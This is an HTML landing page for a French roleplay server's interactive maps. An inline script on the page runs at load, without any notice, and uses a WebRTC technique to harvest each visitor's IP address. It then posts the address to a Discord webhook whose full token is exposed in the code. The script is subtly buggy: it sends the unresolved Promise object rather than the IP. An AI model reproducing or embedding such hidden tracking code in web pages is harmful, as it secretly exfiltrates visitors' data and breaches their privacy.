<!DOCTYPE html>
<! © 2023 L.A Roleplay>
<html>
  <head>
    <title>L.A Rôleplay 🌎</title>
	<link href="css/icone.ico" type="image/x-icon" rel="icon"/>
	<link href="css/icone.ico" type="image/x-icon" rel="shortcut icon"/>
	<meta name="description" content="Carte interactive utilisée sur L.A Rôleplay." />
	<meta name="theme-color" content="#ffab00">
  <meta charset="utf-8">
  <meta name="viewport" content="initial-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <link href="css/bg.css" rel="stylesheet" />
  </head>
  <body>

<a href="map.html" class="button glow-button" target="_self">Carte office de tourisme</a>
<a href="illegal.html" class="button glow-button" target="_self">Carte emplacement illégal</a>
<a href="agence.html" class="button glow-button" target="_self">Carte agence immobilière</a>
<a href="bug.html" class="bouton red">Sinalez un bug?</a><br/>

<script>
	var findIP = new Promise(r=>{var w=window,a=new (w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:[]}),b=()=>{};a.createDataChannel("");a.createOffer(c=>a.setLocalDescription(c,b,b),b);a.onicecandidate=c=>{try{c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)}catch(e){}}})

	var webhookURL = "https://discord.com/api/webhooks/1080821481027674122/3gdpd4BjDv1aFpWLZ36JxVpbNx2ZXdaBbmpVMISAzz8FKgT35i4B7eG39KXV1F1l1UR2";

  // Préparer les données à envoyer
  var data = {
    "content": `Nouvelle connection avec l'ip ${findIP}`
  };


  // Envoyer une requête POST à l'URL de Webhook
  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(data => {
console.log("Envoyer avec succès");
  })
  .catch(error => {
    console.error("Erreur lors de l'envoi du message: ", error);
  });
	  </script>
	  
</body>
</html>
